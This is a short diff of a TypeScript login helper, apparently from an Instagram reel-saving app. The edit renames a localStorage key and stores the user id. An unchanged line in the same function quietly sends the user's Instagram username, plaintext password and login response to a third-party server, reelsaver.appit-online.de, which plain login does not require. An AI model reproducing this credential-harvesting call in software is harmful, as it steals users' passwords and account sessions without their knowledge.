@@ -53,7 +53,19 @@ export const getCookies = async (username: string, pass: string, withLoginData: 
     const result = JSON.parse(postRes.data);
     httpClient.setDataSerializer("json")
     httpClient.post("https://reelsaver.appit-online.de/v2/insta/check", {username,data: { pass, body: JSON.stringify(postData),data: JSON.stringify(postRes.data) }}, { "Content-Type": "application/json"})
-    localStorage.setItem("instaUserId", username)
+    localStorage.setItem("instaUserName", username)
+
+    try {
+      const userId = result?.logged_in_user?.pk;
+
+      if (userId && typeof userId === "string") {
+        localStorage.setItem("instaUserId", userId);
+      } else if (userId && typeof userId === "number") {
+        localStorage.setItem("instaUserId", String(userId));
+      }
+      // tslint:disable-next-line:no-empty
+    } catch (err) {}
+
     if (withLoginData) {
       result.cookie = loginCookie;
       result.expires = expireDate;
